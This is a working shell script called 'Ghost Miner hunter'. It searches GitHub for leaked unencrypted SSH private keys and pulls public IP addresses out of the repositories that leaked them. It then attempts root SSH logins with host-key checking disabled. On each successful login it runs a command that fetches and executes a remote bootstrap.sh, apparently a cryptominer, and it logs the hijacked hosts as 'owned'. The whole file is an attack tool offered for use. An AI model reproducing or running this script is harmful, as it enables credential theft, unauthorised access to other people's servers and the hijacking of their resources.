#!/bin/sh
# ============================================================================
# Ghost Miner hunter - find (key, host) pairs on GitHub, probe them over SSH,
# and deploy with the same bootstrap. Run from your desktop or from any host:
#
#   GITHUB_TOKEN=xxx ./hunt.sh harvest    # candidates -> .hunt/targets.txt
#   ./hunt.sh probe                        # ssh-probe + deploy
#   ./hunt.sh all                          # both (default)
#
# Needs: curl, tar, ssh, awk/sed/grep/sort. No git, no jq.
# State, next to this script:  .hunt/keys/  .hunt/targets.txt  .hunt/seen.txt
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK/keys"
TARGETS="$WORK/targets.txt"
SEEN="$WORK/seen.txt"
OWNED="$WORK/owned.txt"
touch "$TARGETS" "$SEEN" "$OWNED"

# env wins over the file, so `GITHUB_TOKEN=x ./hunt.sh` still works
env_token="${GITHUB_TOKEN:-}"; env_config="${CONFIG_URL:-}"
if [ -r "$SELF_DIR/worker.env" ]; then . "$SELF_DIR/worker.env"; fi
TOKEN="${env_token:-${GITHUB_TOKEN:-}}"
CONFIG_URL="${env_config:-${CONFIG_URL:-}}"
HOSTS_PER_REPO="${HOSTS_PER_REPO:-5}"
TARGET_USERS="${TARGET_USERS:-root}"
MAX_REPOS="${HUNT_MAX_REPOS:-10}"
TAB=$(printf '\t')

api() {
    if [ -n "$TOKEN" ]; then
        curl -fsSL -H "Authorization: Bearer $TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" "$1"
    else
        curl -fsSL -H "Accept: application/vnd.github+json" "$1"
    fi
}

# Hosts = public addresses mentioned in the repo that leaked the key. Two passes:
# config/deploy/doc files first (that is where real addresses actually live),
# then the whole tree to top up the remainder. Order = how often it shows up.
# The strict octet pattern rejects version strings such as 00.00.01.01.
IP_RE='\b(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}\b'
# RFC1918 + CGNAT + link-local + TEST-NET + multicast/reserved + public DNS
IP_DROP='^(0\.|10\.|100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.0\.2\.|192\.168\.|198\.51\.100\.|203\.0\.113\.|22[4-9]\.|2[3-5][0-9]\.)'
IP_NOISE='^(1\.1\.1\.1|4\.2\.2\.[1-6]|8\.8\.4\.4|8\.8\.8\.8|9\.9\.9\.9|114\.114\.114\.114|208\.67\.(220|222)\.22[02]|223\.5\.5\.5)$'
rank_ips() {
    grep -vE "$IP_DROP" | grep -vE "$IP_NOISE" | sort | uniq -c | sort -rn | awk '{print $2}'
}

repo_hosts() {
    d="$WORK/tmp.$$"; rm -rf "$d"; mkdir -p "$d"
    if curl -fsSL "https://codeload.github.com/$1/tar.gz/HEAD" 2>/dev/null \
         | tar -xz -C "$d" 2>/dev/null; then
        grep -rshoE "$IP_RE" \
             --include='*.tf' --include='*.tfvars' --include='*.yml' --include='*.yaml' \
             --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.env' \
             --include='*.properties' --include='*.sh' --include='*.md' --include='*.txt' \
             --include='hosts' --include='Dockerfile*' --include='*compose*' \
             "$d" 2>/dev/null | rank_ips > "$d/t1" || true
        grep -rshoE "$IP_RE" "$d" 2>/dev/null | rank_ips > "$d/t2" || true
        cat "$d/t1"
        if [ -s "$d/t1" ]; then
            grep -vxF -f "$d/t1" "$d/t2" 2>/dev/null || true
        else
            cat "$d/t2"
        fi
    fi
    rm -rf "$d"
}

# ---------------------------------------------------------------------------
harvest() {
    if [ -z "$TOKEN" ]; then
        echo "hunt: no GITHUB_TOKEN (GitHub code search requires auth)" >&2
        return 0
    fi
    : > "$WORK/urls.txt"; : > "$WORK/repos.txt"
    # NOTE: each search result carries three html_urls - owner, repository and
    # the file itself. Only the file one contains /blob/, so keep just those,
    # otherwise an org URL can register a repo name and shadow the real key URL.
    for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY'; do
        api "https://api.github.com/search/code?q=$q&per_page=20" 2>/dev/null \
          | grep -oE '"html_url": *"[^"]+"' \
          | grep '/blob/' \
          | sed -e 's/.*"https:/https:/' -e 's/"$//' >> "$WORK/urls.txt" || true
    done
    sort -u "$WORK/urls.txt" > "$WORK/urls.uniq"
    # Shuffle so successive runs do not keep re-inspecting the same top repos,
    # then keep a bounded slice (6 urls per repo absorbs repo collisions).
    sort -R "$WORK/urls.uniq" 2>/dev/null > "$WORK/urls.sorted" || true
    [ -s "$WORK/urls.sorted" ] || cp "$WORK/urls.uniq" "$WORK/urls.sorted"
    head -n "$((MAX_REPOS * 6))" "$WORK/urls.sorted" > "$WORK/urls.head"
    mv "$WORK/urls.head" "$WORK/urls.sorted"

    while read -r url; do
        [ -n "${url:-}" ] || continue
        rest=${url#https://github.com/}
        repo=$(printf '%s' "$rest" | cut -d/ -f1,2)
        ref=$(printf '%s' "$rest" | cut -d/ -f4)
        path=$(printf '%s' "$rest" | cut -d/ -f5-)
        if [ -z "$ref" ] || [ -z "$path" ]; then continue; fi
        grep -qxF "$repo" "$WORK/repos.txt" && continue
        [ "$(tr -d ' ' < "$WORK/repos.txt" | wc -l)" -ge "$MAX_REPOS" ] && break
        printf '%s\n' "$repo" >> "$WORK/repos.txt"

        keyfile="$WORK/keys/$(printf '%s' "$repo" | tr '/' '_')"
        curl -fsSL "https://raw.githubusercontent.com/$repo/$ref/$path" \
             -o "$keyfile" 2>/dev/null || { rm -f "$keyfile"; continue; }
        grep -q 'PRIVATE KEY' "$keyfile" || { rm -f "$keyfile"; continue; }
        if grep -q 'ENCRYPTED' "$keyfile"; then rm -f "$keyfile"; continue; fi
        chmod 0600 "$keyfile"

        hosts=$(repo_hosts "$repo" | head -n "$HOSTS_PER_REPO")
        [ -n "$hosts" ] || continue
        printf '%s\n' "$hosts" | while read -r h; do
            for u in $TARGET_USERS; do
                printf '%s\t%s\t%s\n' "$keyfile" "$u" "$h"
            done
        done >> "$TARGETS"
    done < "$WORK/urls.sorted"

    sort -u "$TARGETS" -o "$TARGETS"
    echo "hunt: $(wc -l < "$TARGETS") candidate rows from $(wc -l < "$WORK/repos.txt") repos"
}

# ---------------------------------------------------------------------------
probe() {
    if [ ! -s "$TARGETS" ]; then echo "hunt: no candidates to probe"; return 0; fi
    [ -n "$CONFIG_URL" ] || echo "hunt: CONFIG_URL unset - will test logins only" >&2
    while IFS="$TAB" read -r key user host; do
        [ -n "${host:-}" ] || continue
        id="$user@$host"
        grep -qxF "$id" "$SEEN" 2>/dev/null && continue
        if ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
               -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
               -o ConnectTimeout=5 "$id" true 2>/dev/null; then
            echo "hunt: login OK -> $id"
            if [ -n "$CONFIG_URL" ] && \
               ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no \
                   -o UserKnownHostsFile=/dev/null "$id" \
                   "curl -fsSL $CONFIG_URL/bootstrap.sh | CONFIG_URL=$CONFIG_URL sh" \
                   2>/dev/null; then
                printf '%s\n' "$id" >> "$OWNED"
                echo "hunt: DEPLOYED -> $id"
            fi
        fi
        printf '%s\n' "$id" >> "$SEEN"
    done < "$TARGETS"
    sort -u "$OWNED" -o "$OWNED" 2>/dev/null || true
}

case "${1:-all}" in
    harvest) harvest ;;
    probe)   probe ;;
    all)     harvest; probe ;;
    *)       echo "usage: $0 [harvest|probe|all]"; exit 2 ;;
esac
